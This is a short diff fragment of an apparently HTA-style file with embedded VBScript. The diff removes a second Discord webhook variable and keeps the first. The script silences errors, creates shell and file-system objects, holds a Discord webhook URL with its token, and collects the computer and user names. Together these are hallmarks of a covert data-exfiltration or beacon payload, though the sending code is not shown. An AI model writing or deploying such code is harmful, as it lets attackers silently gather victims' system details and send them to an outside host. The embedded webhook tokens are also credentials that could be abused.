@@ -4,11 +4,10 @@
 <script language="VBScript">
 On Error Resume Next
 
-Dim sh, fso, WH, WH2, PC, USER, Q
+Dim sh, fso, WH, PC, USER, Q
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 WH   = "https://discordapp.com/api/webhooks/1554907103381033003/2iyvd7EhyWTXssfzIDaJDbaoMEz4bVOFDF_eZDcJqqDV9FsF5ZT0rOIcqnI-sLhtVLaw"
-WH2  = "https://discordapp.com/api/webhooks/1555082856030666803/rqzqmTRElz_tEjOsh5qtaxyIhFSiZ9r3dWGXXyejRz6RZDfdOR2g3oNXOc6TiK8MSs2U"
 PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 Q    = Chr(34)
